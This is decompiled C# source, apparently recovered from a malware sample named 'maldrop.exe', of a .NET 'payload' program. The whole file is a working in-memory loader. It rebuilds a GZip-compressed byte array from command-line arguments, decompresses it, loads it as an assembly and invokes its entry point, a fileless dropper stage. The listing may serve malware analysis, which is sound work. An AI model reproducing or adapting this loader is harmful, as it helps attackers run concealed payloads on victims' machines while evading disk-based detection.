// Decompiled with JetBrains decompiler
// Type: payload.Program
// Assembly: payload, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 1A5C1017-62A5-414D-A31E-AE49E1982369
// Assembly location: C:\Users\Manzel\Desktop\maldrop.exe_payload.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Reflection;

namespace payload
{
  internal static class Program
  {
    [STAThread]
    private static void Main(string[] args)
    {
      List<byte> byteList1 = new List<byte>();
      for (int index = 0; index < args.Length; ++index)
        byteList1.Add(byte.Parse(args[index]));
      GZipStream gzipStream = new GZipStream((Stream) new MemoryStream(byteList1.ToArray()), CompressionMode.Decompress);
      byte[] buffer = new byte[256];
      List<byte> byteList2 = new List<byte>();
      int count;
      do
      {
        count = gzipStream.Read(buffer, 0, 256);
        byteList2.AddRange(((IEnumerable<byte>) buffer).Take<byte>(count));
      }
      while ((uint) count > 0U);
      Assembly.Load(byteList2.ToArray()).EntryPoint.Invoke((object) null, (object[]) null);
    }
  }
}
